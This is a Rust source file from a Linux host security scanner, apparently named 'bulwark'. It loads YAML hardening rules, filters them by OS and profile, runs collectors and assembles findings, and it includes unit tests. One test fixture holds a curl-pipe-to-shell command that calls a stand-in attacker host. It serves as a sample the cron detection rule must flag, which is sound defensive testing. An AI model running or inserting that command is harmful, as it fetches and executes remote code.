use crate::collectors::Collector;
use crate::condition::Condition;
use crate::models::{
    CollectorError, Finding, FindingStatus, OperatingSystem, Rule, RuleLoadError, ScanRun,
};
use chrono::Utc;
use std::collections::HashMap;
use std::path::Path;
use uuid::Uuid;
use walkdir::WalkDir;

pub struct LoadedRule {
    pub rule: Rule,
    pub condition: Condition,
}

/// Which OS to scan as, and which opt-in "needs" are active — the two axes rules are
/// filtered by (docs/guide/architecture.md's Profiles section). `os` is a hard filter (a
/// macOS-tagged rule never runs on Linux, full stop); `needs` is additive opt-in (a rule
/// tagged `profiles: [server]` only runs when "server" is in `needs`; a rule with no
/// `profiles` tag at all is universal and always runs regardless of `needs`).
#[derive(Debug, Clone)]
pub struct Profile {
    pub os: OperatingSystem,
    pub needs: Vec<String>,
}

impl Profile {
    /// The host's actual OS, no opted-in needs — i.e. exactly the rule set that ran before
    /// profiles existed. Every pre-existing rule defaults to `os: [linux]`, `profiles: []`,
    /// so this reproduces the old unconditional behavior on a Linux host bit-for-bit.
    pub fn current_host() -> Self {
        Self {
            os: OperatingSystem::current().unwrap_or(OperatingSystem::Linux),
            needs: Vec::new(),
        }
    }
}

impl Default for Profile {
    fn default() -> Self {
        Self::current_host()
    }
}

fn rule_matches_profile(rule: &Rule, profile: &Profile) -> bool {
    rule.os.contains(&profile.os)
        && (rule.profiles.is_empty() || rule.profiles.iter().any(|p| profile.needs.contains(p)))
}

/// Loads every `.yaml`/`.yml` file under `dir` as a [`Rule`], parsing its condition too.
/// A rule that fails to parse (bad YAML, unknown fields, or a bad condition expression)
/// is collected as a [`RuleLoadError`] and skipped — never a silent drop and never a panic
/// that takes the rest of the pack down with it (architecture doc §8).
pub fn load_rules(dir: &Path) -> (Vec<LoadedRule>, Vec<RuleLoadError>) {
    let mut loaded = Vec::new();
    let mut errors = Vec::new();

    for entry in WalkDir::new(dir).into_iter().filter_map(Result::ok) {
        let path = entry.path();
        let ext = path.extension().and_then(|e| e.to_str());
        if !matches!(ext, Some("yaml") | Some("yml")) {
            continue;
        }
        let path_str = path.display().to_string();
        let text = match std::fs::read_to_string(path) {
            Ok(t) => t,
            Err(e) => {
                errors.push(RuleLoadError {
                    path: path_str,
                    message: e.to_string(),
                });
                continue;
            }
        };
        let rule: Rule = match serde_yaml::from_str(&text) {
            Ok(r) => r,
            Err(e) => {
                errors.push(RuleLoadError {
                    path: path_str,
                    message: e.to_string(),
                });
                continue;
            }
        };
        match Condition::parse(&rule.condition) {
            Ok(condition) => loaded.push(LoadedRule { rule, condition }),
            Err(e) => errors.push(RuleLoadError {
                path: path_str,
                message: format!("rule {}: bad condition: {}", rule.id, e),
            }),
        }
    }

    (loaded, errors)
}

/// True when running with an effective UID of 0 — the CLI's `--privileged` flag is only
/// honored under `sudo` (architecture doc §4 ADR-0004: no `pkexec` self-elevation from the CLI).
pub fn is_running_as_root() -> bool {
    unsafe { libc::geteuid() == 0 }
}

/// Runs every applicable collector at most once (memoized by name), evaluates every loaded
/// rule against the fact rows its collector produced, and assembles a [`ScanRun`]. A rule
/// referencing an inapplicable or failed collector contributes no findings for that rule,
/// but the failure itself is still surfaced in `collector_errors` — never silent (§8).
/// `privileged` gates collectors that declare [`Collector::requires_privilege`]; when
/// false, they're skipped and named in `privileged_collectors_skipped` rather than run
/// (and failing with a permission error) or silently omitted. `profile` gates both rules
/// (by `Rule::os`/`Rule::profiles`) and collectors (by `Collector::supported_os`) — a
/// macOS/Windows-only collector's `collect()` is structurally unreachable on Linux, not
/// just conventionally skipped.
pub fn run_scan(
    rules_dir: &Path,
    collectors: &[Box<dyn Collector>],
    privileged: bool,
    profile: &Profile,
) -> ScanRun {
    let started_at = Utc::now();
    let scan_run_id = Uuid::new_v4();

    let (all_rules, rule_load_errors) = load_rules(rules_dir);
    let rules: Vec<LoadedRule> = all_rules
        .into_iter()
        .filter(|r| rule_matches_profile(&r.rule, profile))
        .collect();

    let mut needed: HashMap<&str, ()> = HashMap::new();
    for r in &rules {
        needed.insert(r.rule.collector.as_str(), ());
    }

    let mut facts_by_collector: HashMap<String, Vec<crate::models::Fact>> = HashMap::new();
    let mut collector_errors = Vec::new();
    let mut privileged_collectors_skipped = Vec::new();

    for collector in collectors {
        if !needed.contains_key(collector.name()) {
            continue;
        }
        if !collector.supported_os().contains(&profile.os) {
            continue;
        }
        if !collector.is_applicable() {
            continue;
        }
        if collector.requires_privilege() && !privileged {
            privileged_collectors_skipped.push(collector.name().to_string());
            continue;
        }
        match collector.collect() {
            Ok(rows) => {
                facts_by_collector.insert(collector.name().to_string(), rows);
            }
            Err(e) => collector_errors.push(CollectorError {
                collector: collector.name().to_string(),
                message: e.to_string(),
            }),
        }
    }

    let mut findings = Vec::new();
    let now = Utc::now();
    for loaded in &rules {
        let Some(rows) = facts_by_collector.get(loaded.rule.collector.as_str()) else {
            continue;
        };
        for row in rows {
            match loaded.condition.eval(row) {
                Ok(true) => findings.push(Finding {
                    id: Uuid::new_v4(),
                    rule_id: loaded.rule.id.clone(),
                    severity: loaded.rule.severity,
                    // Templated like `explain` (not just a static clone): a list-shaped
                    // collector's rule (module_blacklist, banners, ...) produces one finding
                    // per row, and a title that doesn't distinguish rows reads as duplicated
                    // issues in the UI even though the underlying rows — and the reconciled
                    // storage — are already correctly distinct. Real user report, not a
                    // hypothetical: BLWK-BANN-001's two rows (issue/issue.net) and
                    // BLWK-KERNEL-020's five (one per module) both had this problem.
                    title: render_template(&loaded.rule.title, row),
                    explanation: render_template(&loaded.rule.explain, row),
                    fix_hint: loaded.rule.fix.clone(),
                    context: row.clone(),
                    first_seen: now,
                    last_seen: now,
                    status: FindingStatus::Open,
                    scan_run_id,
                }),
                Ok(false) => {}
                Err(e) => collector_errors.push(CollectorError {
                    collector: loaded.rule.collector.clone(),
                    message: format!("rule {} condition error: {}", loaded.rule.id, e),
                }),
            }
        }
    }

    ScanRun {
        id: scan_run_id,
        started_at,
        finished_at: Some(Utc::now()),
        host_fingerprint: host_fingerprint(),
        rules_loaded: rules.len(),
        rule_load_errors,
        collector_errors,
        privileged_collectors_skipped,
        findings,
    }
}

/// Minimal `{{ field }}` interpolation into a rule's `explain` template — deliberately not a
/// full template engine, matching the "flat condition DSL, not a new language" philosophy.
fn render_template(template: &str, fact: &crate::models::Fact) -> String {
    let mut out = String::with_capacity(template.len());
    let mut rest = template;
    while let Some(start) = rest.find("{{") {
        out.push_str(&rest[..start]);
        rest = &rest[start + 2..];
        let Some(end) = rest.find("}}") else {
            out.push_str("{{");
            out.push_str(rest);
            return out;
        };
        let field = rest[..end].trim();
        let field = field.split_once('.').map(|(_, r)| r).unwrap_or(field);
        if let Some(v) = fact.get(field) {
            match v {
                serde_json::Value::String(s) => out.push_str(s),
                other => out.push_str(&other.to_string()),
            }
        }
        rest = &rest[end + 2..];
    }
    out.push_str(rest);
    out
}

fn host_fingerprint() -> String {
    let hostname = std::fs::read_to_string("/etc/hostname")
        .unwrap_or_default()
        .trim()
        .to_string();
    let kernel = std::fs::read_to_string("/proc/sys/kernel/osrelease")
        .unwrap_or_default()
        .trim()
        .to_string();
    format!("{hostname}/{kernel}")
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::io::Write;

    struct FixedCollector {
        rows: Vec<crate::models::Fact>,
    }
    impl Collector for FixedCollector {
        fn name(&self) -> &'static str {
            "sshd_config"
        }
        fn collect(&self) -> anyhow::Result<Vec<crate::models::Fact>> {
            Ok(self.rows.clone())
        }
    }

    fn write_rule(dir: &Path, filename: &str, yaml: &str) {
        let path = dir.join(filename);
        let mut f = std::fs::File::create(path).unwrap();
        f.write_all(yaml.as_bytes()).unwrap();
    }

    #[test]
    fn end_to_end_scan_produces_expected_finding() {
        let tmp = tempfile::tempdir().unwrap();
        write_rule(
            tmp.path(),
            "ssh-password-auth.yaml",
            r#"
id: BLWK-SSH-001
title: SSH password authentication is enabled
category: ssh-remote-access
severity: critical
collector: sshd_config
condition: password_authentication == "yes"
explain: "PasswordAuthentication is '{{ sshd.password_authentication }}'"
fix: "Set PasswordAuthentication no"
references: [CIS-5.2.10]
"#,
        );

        let mut fact = crate::models::Fact::new();
        fact.insert(
            "password_authentication".to_string(),
            serde_json::Value::String("yes".to_string()),
        );
        let collectors: Vec<Box<dyn Collector>> =
            vec![Box::new(FixedCollector { rows: vec![fact] })];

        let scan = run_scan(tmp.path(), &collectors, false, &Profile::default());
        assert_eq!(scan.rules_loaded, 1);
        assert!(scan.rule_load_errors.is_empty());
        assert_eq!(scan.findings.len(), 1);
        assert_eq!(scan.findings[0].rule_id, "BLWK-SSH-001");
        assert_eq!(
            scan.findings[0].explanation,
            "PasswordAuthentication is 'yes'"
        );
    }

    struct PrivilegedFixedCollector {
        rows: Vec<crate::models::Fact>,
    }
    impl Collector for PrivilegedFixedCollector {
        fn name(&self) -> &'static str {
            "sudoers"
        }
        fn requires_privilege(&self) -> bool {
            true
        }
        fn collect(&self) -> anyhow::Result<Vec<crate::models::Fact>> {
            Ok(self.rows.clone())
        }
    }

    #[test]
    fn privileged_collector_is_skipped_and_reported_when_unprivileged() {
        let tmp = tempfile::tempdir().unwrap();
        write_rule(
            tmp.path(),
            "sudo-nopasswd.yaml",
            r#"
id: BLWK-PRIV-001
title: NOPASSWD sudo entry
category: privilege-escalation
severity: high
collector: sudoers
condition: nopasswd == true
explain: "e"
fix: "f"
"#,
        );
        let mut fact = crate::models::Fact::new();
        fact.insert("nopasswd".to_string(), serde_json::Value::Bool(true));
        let collectors: Vec<Box<dyn Collector>> =
            vec![Box::new(PrivilegedFixedCollector { rows: vec![fact] })];

        let unprivileged = run_scan(tmp.path(), &collectors, false, &Profile::default());
        assert_eq!(unprivileged.privileged_collectors_skipped, vec!["sudoers"]);
        assert!(
            unprivileged.findings.is_empty(),
            "a skipped collector must not silently pass as clean"
        );

        let privileged = run_scan(tmp.path(), &collectors, true, &Profile::default());
        assert!(privileged.privileged_collectors_skipped.is_empty());
        assert_eq!(privileged.findings.len(), 1);
    }

    #[test]
    fn invalid_rule_is_reported_not_silently_dropped() {
        let tmp = tempfile::tempdir().unwrap();
        write_rule(tmp.path(), "broken.yaml", "not: [valid, rule, schema");
        let (rules, errors) = load_rules(tmp.path());
        assert!(rules.is_empty());
        assert_eq!(errors.len(), 1);
    }

    /// Regression test for a real gap caught while raising this crate's test coverage: a
    /// rule's `collector:` field is only checked against the YAML schema, never against the
    /// actual registered collectors — a typo there loads without error and then simply
    /// never matches a fact row at scan time, silently never firing. `bulwark-cli`'s `rules
    /// validate` now cross-checks this too, but the bundled pack's own correctness belongs
    /// in bulwark-core's own test suite, not only in a CLI-level check.
    #[test]
    fn every_bundled_rule_references_a_real_collector() {
        let rules_dir = Path::new(env!("CARGO_MANIFEST_DIR")).join("../../rules");
        let (rules, errors) = load_rules(&rules_dir);
        assert!(
            errors.is_empty(),
            "bundled rule pack failed to load: {errors:?}"
        );

        let known: std::collections::HashSet<&str> = crate::collectors::all_collectors()
            .iter()
            .map(|c| c.name())
            .collect::<Vec<_>>()
            .into_iter()
            .collect();
        for loaded in &rules {
            assert!(
                known.contains(loaded.rule.collector.as_str()),
                "{} references unknown collector '{}'",
                loaded.rule.id,
                loaded.rule.collector
            );
        }
    }

    /// Regression test for a real bug caught by dogfooding this rule pack against a live
    /// machine: BLWK-ACCT-001's regex had a backslash-escaping mismatch that made `.*sh`
    /// match almost anything ending in "sh", flagging every legitimate `*.sh` cron script
    /// as a critical finding. Loads the actual bundled rule pack, not a fixture copy, so a
    /// future edit to the real YAML is what this test protects.
    #[test]
    fn bundled_ruleset_does_not_false_positive_on_ordinary_shell_scripts() {
        let rules_dir = Path::new(env!("CARGO_MANIFEST_DIR")).join("../../rules");
        let (rules, errors) = load_rules(&rules_dir);
        assert!(
            errors.is_empty(),
            "bundled rule pack failed to load: {errors:?}"
        );

        let acct_001 = rules
            .iter()
            .find(|r| r.rule.id == "BLWK-ACCT-001")
            .expect("BLWK-ACCT-001 should be in the bundled pack");

        let mut benign = crate::models::Fact::new();
        benign.insert(
            "command".to_string(),
            serde_json::Value::String(
                "cd /home/user/proj && bash scripts/daily_job_scraper.sh >> log 2>&1".to_string(),
            ),
        );
        assert!(
            !acct_001.condition.eval(&benign).unwrap(),
            "an ordinary .sh cron script must not be flagged"
        );

        let mut malicious = crate::models::Fact::new();
        malicious.insert(
            "command".to_string(),
            serde_json::Value::String("curl -s https://evil.example/install | sh".to_string()),
        );
        assert!(
            acct_001.condition.eval(&malicious).unwrap(),
            "a real curl-pipe-to-sh pattern must still be flagged"
        );
    }

    /// Regression coverage for the Lynis-derived SSH-004..011 rule pack: loads the real
    /// bundled rules and evaluates them against `parse_sshd_config` output (not a hand-built
    /// fact map) for both a deliberately weakened and a hardened sshd_config, so a future
    /// edit to either the YAML or the sshd_config parser breaks this test instead of shipping
    /// silently. Each of the 8 new rules must fire on the weak config and stay quiet on the
    /// hardened one — a rule that's always-on or always-off would pass a "does it load"
    /// check but be useless in practice.
    #[test]
    fn ssh_hardening_rules_fire_on_weak_config_and_stay_quiet_on_hardened_config() {
        let rules_dir = Path::new(env!("CARGO_MANIFEST_DIR")).join("../../rules");
        let (rules, errors) = load_rules(&rules_dir);
        assert!(
            errors.is_empty(),
            "bundled rule pack failed to load: {errors:?}"
        );

        let weak_text = "X11Forwarding yes\n\
             AllowTcpForwarding yes\n\
             PermitUserEnvironment yes\n\
             PermitTunnel yes\n\
             StrictModes no\n\
             GatewayPorts yes\n\
             AllowAgentForwarding yes\n\
             MaxAuthTries 999\n";
        let weak_fact = crate::collectors::sshd::parse_sshd_config(weak_text);

        let hardened_text = "X11Forwarding no\n\
             AllowTcpForwarding no\n\
             PermitUserEnvironment no\n\
             PermitTunnel no\n\
             StrictModes yes\n\
             GatewayPorts no\n\
             AllowAgentForwarding no\n\
             MaxAuthTries 3\n";
        let hardened_fact = crate::collectors::sshd::parse_sshd_config(hardened_text);

        for rule_id in [
            "BLWK-SSH-004",
            "BLWK-SSH-005",
            "BLWK-SSH-006",
            "BLWK-SSH-007",
            "BLWK-SSH-008",
            "BLWK-SSH-009",
            "BLWK-SSH-010",
            "BLWK-SSH-011",
        ] {
            let loaded = rules
                .iter()
                .find(|r| r.rule.id == rule_id)
                .unwrap_or_else(|| panic!("{rule_id} should be in the bundled pack"));
            assert!(
                loaded.condition.eval(&weak_fact).unwrap(),
                "{rule_id} should fire on a deliberately weakened sshd_config"
            );
            assert!(
                !loaded.condition.eval(&hardened_fact).unwrap(),
                "{rule_id} should stay quiet on a hardened sshd_config"
            );
        }
    }

    #[test]
    fn is_running_as_root_matches_the_real_euid() {
        // Test runners are essentially never root — exercises the function against the
        // real geteuid() rather than a fixture, which is the only honest way to test a
        // one-line FFI wrapper like this.
        assert_eq!(is_running_as_root(), unsafe { libc::geteuid() == 0 });
    }

    struct FailingCollector;
    impl Collector for FailingCollector {
        fn name(&self) -> &'static str {
            "sshd_config"
        }
        fn collect(&self) -> anyhow::Result<Vec<crate::models::Fact>> {
            anyhow::bail!("permission denied reading config")
        }
    }

    #[test]
    fn a_collector_that_errors_is_reported_not_silently_skipped() {
        let tmp = tempfile::tempdir().unwrap();
        write_rule(
            tmp.path(),
            "ssh-password-auth.yaml",
            r#"
id: BLWK-SSH-001
title: t
category: c
severity: low
collector: sshd_config
condition: password_authentication == "yes"
explain: "e"
fix: "f"
"#,
        );
        let collectors: Vec<Box<dyn Collector>> = vec![Box::new(FailingCollector)];
        let scan = run_scan(tmp.path(), &collectors, false, &Profile::default());
        assert!(scan.findings.is_empty());
        assert_eq!(scan.collector_errors.len(), 1);
        assert_eq!(scan.collector_errors[0].collector, "sshd_config");
        assert!(scan.collector_errors[0]
            .message
            .contains("permission denied"));
    }

    /// A rule file that's listed by the directory walk but fails to *read* (permission
    /// revoked between listing and open, a race any real filesystem can hit) must be
    /// reported the same way a malformed-YAML file is — never silently dropped.
    #[test]
    fn an_unreadable_rule_file_is_reported_not_silently_dropped() {
        use std::os::unix::fs::PermissionsExt;

        let tmp = tempfile::tempdir().unwrap();
        write_rule(tmp.path(), "unreadable.yaml", "id: BLWK-TEST-001\n");
        let path = tmp.path().join("unreadable.yaml");
        std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o000)).unwrap();

        let (rules, errors) = load_rules(tmp.path());

        // Restore permissions so the tempdir can clean itself up.
        std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o644)).unwrap();

        // Running as root (e.g. some CI containers) ignores the permission bits entirely —
        // skip the assertion in that case rather than asserting a false failure.
        if !is_running_as_root() {
            assert!(rules.is_empty());
            assert_eq!(errors.len(), 1);
        }
    }

    #[test]
    fn render_template_leaves_an_unterminated_placeholder_verbatim() {
        let fact = crate::models::Fact::new();
        assert_eq!(
            render_template("value: {{ unclosed", &fact),
            "value: {{ unclosed"
        );
    }

    #[test]
    fn rule_with_bad_condition_is_reported() {
        let tmp = tempfile::tempdir().unwrap();
        write_rule(
            tmp.path(),
            "bad-condition.yaml",
            r#"
id: BLWK-TEST-001
title: t
category: c
severity: low
collector: sshd_config
condition: "this is not == a valid ["
explain: "e"
fix: "f"
"#,
        );
        let (rules, errors) = load_rules(tmp.path());
        assert!(rules.is_empty());
        assert_eq!(errors.len(), 1);
        assert!(errors[0].message.contains("BLWK-TEST-001"));
    }
}
